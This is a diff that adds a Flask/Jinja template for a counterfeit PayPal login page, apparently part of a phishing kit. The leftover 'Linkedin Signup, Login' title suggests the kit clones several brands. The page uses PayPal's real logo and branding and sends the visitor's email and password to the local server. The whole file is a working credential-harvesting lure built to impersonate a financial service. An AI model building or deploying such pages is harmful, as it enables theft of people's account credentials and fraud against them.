@@ -1,0 +1,41 @@
+
+{% block head%} 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='../../static/paypal/main.css') }}">
+    <title>Linkedin Signup, Login | Linkedin Page</title>
+</head>
+{% endblock %}
+
+
+{% block body %}
+<div id="main" class="main " role="main">
+    <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
+        <div class="corral">
+              <div id="content" class="contentContainer">
+                <header>
+                    <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
+                  </header>
+                  <form action="/" method="POST">
+                    <div id="passwordSection" class="clearfix">
+                        <div class="textInput" id="login_emaildiv">
+                            <div class="fieldWrapper">
+                                <label for="email" class="fieldLabel">Email</label>
+                                <input id="email" name="username" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email">
+                           </div>
+                        </div>
+                        
+                     <div class="textInput lastInputField" id="login_passworddiv">
+                         <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
+                            <input id="password" name="password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password">
+                       </div>
+                     </div>
+                   </div>
+               <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
+               </form>
+               
+               <a href="#" class="button secondary" id="createAccount">Sign Up</a></div></div></section></div>
+
+
+{% endblock %}
